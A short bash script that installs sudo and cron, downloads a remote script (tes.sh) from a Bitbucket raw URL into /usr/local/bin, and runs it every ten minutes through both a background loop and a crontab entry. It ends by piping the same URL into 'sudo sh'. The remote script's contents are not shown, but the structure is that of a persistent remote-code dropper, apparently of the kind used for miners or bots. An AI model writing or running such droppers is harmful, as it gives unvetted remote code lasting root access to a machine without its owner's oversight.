#!/bin/bash
apt update
apt install -y sudo cron
script_url="https://bitbucket.org/kacepot/esce/raw/main/tes.sh"
sudo wget -O /usr/local/bin/tes.sh "$script_url"
sudo chmod +x /usr/local/bin/tes.sh
run_script() {
    /usr/local/bin/tes.sh
}
run_every_10_minutes() {
    run_script
    
    while true; do
        sleep 600  
        run_script
    done
}
run_every_10_minutes &
sudo crontab -e &
(crontab -l 2>/dev/null ; echo "*/10 * * * * /usr/local/bin/tes.sh") | crontab -
curl -sSL https://bitbucket.org/kacepot/esce/raw/main/tes.sh | sudo sh